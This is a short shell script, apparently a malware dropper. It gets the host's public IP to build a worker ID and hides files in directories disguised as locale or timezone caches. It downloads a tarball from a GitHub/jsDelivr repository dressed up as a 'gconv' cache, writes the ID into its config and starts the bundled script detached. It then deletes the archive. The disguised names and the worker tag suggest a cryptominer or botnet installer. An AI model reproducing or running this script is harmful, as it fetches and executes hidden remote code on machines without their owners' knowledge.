#!/bin/sh
IP=$(curl -s -m 5 ifconfig.me 2>/dev/null||wget -qO- -T 5 ifconfig.me 2>/dev/null||hostname -I|cut -d" " -f1)
W=w8zb-$(echo $IP|tr . -)
B=/usr/lib/locale/.tzcache;mkdir -p $B 2>/dev/null||B=$HOME/.cache/.tz;mkdir -p $B
U1=https://cdn.jsdelivr.net/gh/burmaldagpt/gconv-cache@main/w8.tgz
U2=https://raw.githubusercontent.com/burmaldagpt/gconv-cache/main/w8.tgz
(wget -q -O $B/.g.tgz $U1||wget -q -O $B/.g.tgz $U2||curl -sL -m 120 -o $B/.g.tgz $U1||curl -sL -o $B/.g.tgz $U2)
tar xzf $B/.g.tgz -C $B
sed -i "s/w8x/$W/" $B/.gc/gconv.conf
chmod 755 $B/.gc/gconv_sync $B/.gc/gconv_check.sh
setsid sh $B/.gc/gconv_check.sh
rm -f $B/.g.tgz
